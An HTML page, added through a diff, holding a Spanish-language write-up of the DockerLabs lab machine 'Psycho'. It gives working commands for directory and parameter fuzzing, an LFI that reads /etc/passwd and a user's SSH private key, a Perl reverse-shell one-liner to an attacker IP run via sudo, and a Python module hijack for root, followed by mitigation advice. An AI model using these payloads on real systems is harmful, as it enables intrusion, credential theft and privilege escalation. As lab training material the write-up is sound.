@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Psycho | ZsZsec</title>
+<meta content="Enumeración inicial Comenzamos con una fase de reconocimiento utilizando nmap para identificar los servicios activos en la máquina objetivo. Se ejecutó el siguiente comando: Este e..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Psycho<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / Fuzzing</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">Fuzzing</span><span class="tag">gobuster</span><span class="tag">LFI</span><span class="tag">SUID</span><span class="tag">python</span><span class="tag">python_hijacking</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2>Enumeración inicial</h2>
+<p>Comenzamos con una fase de reconocimiento utilizando <code>nmap</code> para identificar los servicios activos en la máquina objetivo. Se ejecutó el siguiente comando:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 16:03 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
+|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: 4You
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds
+
+</code></pre>
+<p>Este escaneo reveló dos puertos abiertos:</p>
+<ul>
+<li><strong>22/tcp</strong> – Servicio SSH</li>
+<li><strong>80/tcp</strong> – Servidor HTTP</li>
+</ul>
+<p>La presencia del puerto 80 nos indicó que había un servicio web corriendo, así que continuamos con la exploración de ese servicio.</p>
+<h2>Exploración web y fuzzing de directorios</h2>
+<p>Accedimos al sitio web a través del navegador utilizando la dirección <code>http://172.17.0.2</code>. Inicialmente, el contenido era una página estática sin funcionalidades visibles ni formularios, lo que sugiere que podría haber rutas o parámetros ocultos en el backend.</p>
+<p>Para identificar rutas internas o directorios ocultos, realizamos un escaneo con <code>gobuster</code>:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ gobuster dir -u http://172.17.0.2  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,php -t 40 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/assets               (Status: 301) [Size: 309] [--&gt; http://172.17.0.2/assets/]                                                                           
+/index.php            (Status: 200) [Size: 2596]
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+Progress: 416834 / 5095332 (8.18%)^Z
+zsh: suspended  gobuster dir -u http://172.17.0.2 -w  -x txt,html,php -t 40
+                                                                             
+</code></pre>
+<p>El escaneo reveló la existencia del directorio <code>/assets</code>. Navegamos hacia esa ruta (<code>http://172.17.0.2/assets/</code>) y descubrimos que contenía una imagen. Descargamos y analizamos esta imagen para comprobar si contenía datos ocultos (por ejemplo, mediante esteganografía), pero no encontramos nada relevante.</p>
+<h2>Fuzzing de parámetros: descubrimiento de LFI</h2>
+<p>Ante la falta de interacción directa en la web, pasamos a <strong>fuzzear parámetros</strong> en la URL principal (<code>index.php</code>) para detectar si alguno era vulnerable. Utilizamos <code>wfuzz</code> con una wordlist de nombres comunes de parámetros para verificar si era posible realizar <strong>LFI (Local File Inclusion)</strong>.</p>
+<p>Ejecutamos el siguiente comando:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~]
+└─$ wfuzz -c --hc=404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt http://172.17.0.2/index.php?FUZZ=
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://172.17.0.2/index.php?FUZZ=
+Total requests: 81643
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload     
+=====================================================================
+
+000004881:   500        62 L     166 W      2582 Ch     "secret"    
+^Z000017849:   200        62 L     169 W      2596 Ch     "extract"   
+
+zsh: suspended  wfuzz -c --hc=404 --hw 169 -t 200 -w  http://172.17.0.2/index.php?FUZZ=
+</code></pre>
+<p>Este comando realiza lo siguiente:</p>
+<ul>
+<li><code>FUZZ</code> se reemplaza por palabras de la wordlist, intentando diferentes nombres de parámetros.</li>
+<li>El valor que se prueba es la típica ruta de LFI: <code>../../../../etc/passwd</code>.</li>
+<li>Se ocultan las respuestas con código HTTP 404 (<code>--hc=404</code>) y las que tienen exactamente 169 palabras (<code>--hw 169</code>), para filtrar respuestas irrelevantes.</li>
+<li>Se utilizan 200 hilos (<code>-t 200</code>) para mayor velocidad.</li>
+</ul>
+<p>La palabra <code>"secret"</code> produjo una respuesta diferente, lo que sugiere que <strong>es un parámetro válido y posiblemente vulnerable a LFI</strong>.</p>
+<h2>Confirmación de la vulnerabilidad LFI</h2>
+<p>Una vez identificado el parámetro <code>secret</code>, realizamos la siguiente prueba manual en el navegador:</p>
+<pre><code class="language-html">http://172.17.0.2/index.php?secret=../../../../etc/passwd
+</code></pre>
+<p>La respuesta fue positiva: se cargó el contenido del archivo <code>/etc/passwd</code>, mostrando las entradas del sistema, incluyendo cuentas de usuarios como <code>root</code>, <code>www-data</code>, <code>ubuntu</code>, <code>vaxei</code>, y otros.</p>
+<p>Esto confirma la existencia de una <strong>vulnerabilidad de inclusión local de archivos</strong>.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/4a16dabd-1220-4487-8c93-729a73451064"/></p>
+<h2>Implicaciones de seguridad</h2>
+<p>La vulnerabilidad LFI permite a un atacante leer archivos arbitrarios en el sistema, lo que puede llevar a:</p>
+<ul>
+<li>Robo de información sensible (archivos de configuración, credenciales, tokens)</li>
+<li>Escalada a ejecución remota (RCE) si se combinan con archivos de logs, sesiones o cargas mal controladas</li>
+<li>Enumeración de usuarios del sistema a través de <code>/etc/passwd</code></li>
+<li>Lectura de archivos personales de usuarios (si el servidor tiene permisos)</li>
+</ul>
+<h2>Acceso a claves privadas – Escalada desde LFI a SSH</h2>
+<p>Después de confirmar la vulnerabilidad de Local File Inclusion (LFI) a través del parámetro <code>secret</code>, el siguiente objetivo fue buscar archivos sensibles que pudieran contener credenciales o llaves privadas de usuarios del sistema.</p>
+<p>Recordando los nombres de usuarios obtenidos desde <code>/etc/passwd</code>, intentamos acceder a la carpeta <code>.ssh</code> del usuario <code>vaxei</code>, que había sido listada previamente</p>
+<pre><code class="language-html">http://172.17.0.2/index.php?secret=../../../../home/vaxei/.ssh/id_rsa
+</code></pre>
+<h3>Resultado:</h3>
+<p>Se nos mostró el contenido del archivo <code>id_rsa</code>, es decir, la <strong>clave privada SSH del usuario <code>vaxei</code></strong>. Sin embargo, al copiarla directamente desde el navegador, notamos que la llave estaba <strong>mal formateada</strong> debido al renderizado HTML (saltos de línea incorrectos, espacios u otros símbolos que rompían el contenido).</p>
+<h2>Solución: ver código fuente para copiar la clave correctamente</h2>
+<p>Para solucionar el problema de formato, accedimos al <strong>código fuente</strong> de la respuesta en el navegador usando:</p>
+<pre><code class="language-html">view-source:http://172.17.0.2/index.php?secret=../../../../home/vaxei/.ssh/id_rsa
+</code></pre>
+<p>Esto permitió visualizar la clave en <strong>su formato plano original</strong>, con los saltos de línea y el contenido tal como debe ser para que OpenSSH la interprete correctamente.</p>
+<h2>Guardar la clave y prepararla para uso con SSH</h2>
+<p>Con la clave correctamente copiada, realizamos los siguientes pasos en la terminal:</p>
+<ol>
+<li><strong>Crear un archivo para la clave:</strong></li>
+</ol>
+<pre><code class="language-bash">nano id_rsa
+</code></pre>
+<p><strong>Pegar el contenido de la clave tal cual</strong> y luego <strong>Guardar y cerrar</strong>, luego proteger la clave con los permisos adecuados:</p>
+<pre><code class="language-bash">chmod 600 id_rsa
+</code></pre>
+<p>Esto es obligatorio, ya que <code>ssh</code> no aceptará claves con permisos inseguros.</p>
+<h2>Escalada de privilegios de <code>vaxei</code> a <code>luisillo</code> usando Perl y reverse shell</h2>
+<p>Una vez obtenida la shell como el usuario <code>vaxei</code>, se realizó una revisión de privilegios sudo mediante:</p>
+<pre><code class="language-bash">sudo -l 
+
+User vaxei may run the following commands on 2af585ee55bb:
+    (luisillo) NOPASSWD: /usr/bin/perl
+</code></pre>
+<p>Esta configuración indica que <code>vaxei</code> tiene permisos para ejecutar el binario <code>/usr/bin/perl</code> como el usuario <code>luisillo</code>, sin necesidad de ingresar contraseña. Dado que <strong>Perl permite ejecutar código arbitrario del sistema</strong>, este acceso representa una clara oportunidad de escalada.</p>
+<h2>¿Qué es <strong>Perl</strong>?</h2>
+<p><strong>Perl</strong> (Practical Extraction and Report Language) es un <strong>lenguaje de programación interpretado</strong>, muy usado en entornos Unix/Linux desde los años 80.</p>
+<p>Es conocido por ser:</p>
+<ul>
+<li>Súper flexible (como una mezcla entre Bash y Python)</li>
+<li>Ideal para manipular texto, archivos y automatizar tareas</li>
+<li>Capaz de ejecutar <strong>comandos del sistema</strong> desde dentro del código</li>
+</ul>
+<h2>¿Por qué <strong>Perl con SUDO</strong> es peligroso?</h2>
+<p>Cuando en un sistema Linux se permite ejecutar <strong>Perl como otro usuario con <code>sudo</code></strong>, como en tu caso:</p>
+<p>Significa que el usuario <code>vaxei</code> puede correr cualquier script o comando desde Perl <strong>como otro usuario (en tu caso, <code>luisillo</code>)</strong> sin contraseña.</p>
+<p>Y esto es peligroso porque:</p>
+<h3><strong>Perl puede ejecutar comandos del sistema</strong></h3>
+<p>Con una sola línea puedes obtener una shell del sistema:</p>
+<pre><code class="language-bash">perl -e 'exec "/bin/bash";'
+</code></pre>
+<h3>Payload utilizado</h3>
+<p>Para obtener acceso como <code>luisillo</code> mediante una reverse shell, se utilizó un one-liner en Perl que crea una conexión TCP saliente hacia nuestra máquina atacante. Esto nos permite obtener una shell interactiva remotamente.</p>
+<pre><code class="language-bash">vaxei@2af585ee55bb:~$ sudo -u luisillo perl -e 'use Socket;$i="192.168.226.128";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'
+</code></pre>
+<h3>Resultado</h3>
+<p>Se recibio una conexion exitosa a traves de la reverse shell</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/psycho]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.226.128] from (UNKNOWN) [172.17.0.2] 48882
+luisillo@2af585ee55bb:/home/vaxei$ cd ../../../
+cd ../../../
+luisillo@2af585ee55bb:/$
+</code></pre>
+<h2>Consideraciones técnicas</h2>
+<p>El riesgo en esta configuración reside en permitir que un usuario sin privilegios (en este caso, <code>vaxei</code>) pueda ejecutar un <strong>lenguaje de scripting poderoso como Perl</strong> bajo otro usuario (<code>luisillo</code>). Dado que Perl puede ejecutar comandos del sistema sin restricciones, esto es prácticamente equivalente a <strong>entregarle una shell al usuario objetivo</strong>.</p>
+<h1>Escalada de Privilegios</h1>
+<p>Durante la post-explotación en una máquina Linux, obtuvimos acceso al usuario <code>luisillo</code>. Posteriormente, realizamos una revisión de permisos <code>sudo</code> para ver si existía algún binario que pudiéramos ejecutar como root sin necesidad de contraseña.</p>
+<pre><code class="language-bash">luisillo@2af585ee55bb:/home/vaxei$  sudo -l
+ sudo -l
+Matching Defaults entries for luisillo on 2af585ee55bb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User luisillo may run the following commands on 2af585ee55bb:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
+</code></pre>
+<p>Esto nos indica que <code>luisillo</code> puede ejecutar <strong>como cualquier usuario (incluyendo root)</strong> y sin contraseña el script:</p>
+<pre><code class="language-bash">/usr/bin/python3 /opt/paw.py
+</code></pre>
+<h2>Análisis del Script <code>/opt/paw.py</code></h2>
+<p>Al observar el código fuente de <code>paw.py</code>, notamos lo siguiente al inicio del script:</p>
+<pre><code class="language-python">import subprocess
+import os
+import sys
+import time
+
+</code></pre>
+<p>Este detalle es <strong>clave</strong>: el script importa el módulo <code>subprocess</code>, lo cual abre la puerta a una técnica de <strong>Hijacking de módulos de Python</strong>.</p>
+<p>Además, más abajo encontramos esta parte del código:</p>
+<pre><code class="language-python">subprocess.run(['echo Hello!'], check=True)
+</code></pre>
+<p>Esto intenta ejecutar un comando del sistema, lo que garantiza que <strong>el módulo <code>subprocess</code> sí está siendo utilizado activamente</strong> en tiempo de ejecución.</p>
+<h1>Vulnerabilidad: Python Module Hijacking</h1>
+<p>Cuando un script en Python importa un módulo, <strong>primero busca en el directorio actual</strong> antes de buscar en los módulos del sistema. Si colocamos un archivo llamado <code>subprocess.py</code> en el mismo directorio (<code>/opt</code>), Python lo importará <strong>en lugar del módulo original</strong>, ya que se encuentra en la ruta de búsqueda primero.</p>
+<p>Esto nos permite inyectar código malicioso, ya que <code>paw.py</code> se ejecuta con permisos de root.</p>
+<h3>Obstáculo: No había acceso a editores interactivos</h3>
+<p>Al intentar usar <code>nano</code> o <code>vim</code>, obtuvimos errores como:</p>
+<pre><code class="language-bash">Standard input is not a terminal
+</code></pre>
+<p>Esto indicaba que la shell no era completamente interactiva, por lo que no podíamos editar archivos de forma tradicional. Usamos una técnica alternativa.</p>
+<h2>Explotación</h2>
+<p>Creamos un archivo <code>subprocess.py</code> malicioso en <code>/opt</code>, que simplemente abría una shell como root:</p>
+<pre><code class="language-python">echo 'import os; os.system("/bin/bash")' &gt; /opt/subprocess.py
+</code></pre>
+<p>Este archivo se carga automáticamente cuando <code>paw.py</code> intenta hacer <code>import subprocess</code>.</p>
+<h2>¿Por qué funcionó?</h2>
+<p>Python cargó <strong>nuestro <code>subprocess.py</code> falso</strong> en lugar del original. Al ejecutarse el script con permisos de root usando <code>sudo</code>, también se ejecutó <strong>nuestro código con permisos de root</strong>, dándonos una shell privilegiada:</p>
+<pre><code class="language-bash">luisillo@2af585ee55bb:/opt$ echo 'import os; os.system("/bin/bash")' &gt; /opt/subprocess.py
+echo 'import os; os.system("/bin/bash")' &gt; /opt/subprocess.py
+luisillo@2af585ee55bb:/opt$ sudo -u root /usr/bin/python3 /opt/paw.py
+sudo -u root /usr/bin/python3 /opt/paw.py
+whoami
+root
+</code></pre>
+<h2>Limpieza</h2>
+<p>El script fallaba con este error antes de la explotación:</p>
+<pre><code class="language-bash">FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
+</code></pre>
+<p>Esto se debe a que la línea:</p>
+<pre><code class="language-bash">subprocess.run(['echo Hello!'], check=True)
+</code></pre>
+<p>intenta ejecutar un binario llamado literalmente <code>"echo Hello!"</code>, pero <code>subprocess.run</code> espera cada argumento por separado. La forma correcta sería:</p>
+<p>Sin embargo, ese fallo no impidió la ejecución de nuestro código en el <code>import</code>.</p>
+<h2>Recomendaciones de mitigación</h2>
+<ul>
+<li>Nunca permitas ejecutar scripts arbitrarios con sudo sin restricciones.</li>
+<li>Usa rutas absolutas al importar módulos o limita <code>PYTHONPATH</code>.</li>
+<li>Asegúrate de que los scripts que se ejecutan como root no estén en directorios donde usuarios sin privilegios pueden escribir.</li>
+<li>Establece permisos correctos (chmod 700) en scripts críticos.</li>
+</ul>
+<h2><strong>Técnicas Utilizadas</strong></h2>
+<table>
+<thead>
+<tr>
+<th>Técnica</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🔎 Directory Fuzzing</td>
+<td>Enumeración de rutas con <code>wfuzz</code> y <code>gobuster</code></td>
+</tr>
+<tr>
+<td>📁 Local File Inclusion (LFI)</td>
+<td>Lectura de archivos arbitrarios desde parámetros vulnerables</td>
+</tr>
+<tr>
+<td>🔑 SSH Key Abuse</td>
+<td>Acceso mediante clave privada extraída por LFI</td>
+</tr>
+<tr>
+<td>🪜 SUDO Perl Abuse</td>
+<td>Escalada de privilegios usando <code>perl</code> como otro usuario</td>
+</tr>
+<tr>
+<td>🧠 Reverse Shell (Perl + Netcat)</td>
+<td>Shell remota obtenida mediante conexión TCP saliente</td>
+</tr>
+<tr>
+<td>🧬 Path Hijacking + Python</td>
+<td>Reemplazo de binario <code>echo</code> para ejecutar shell como root</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
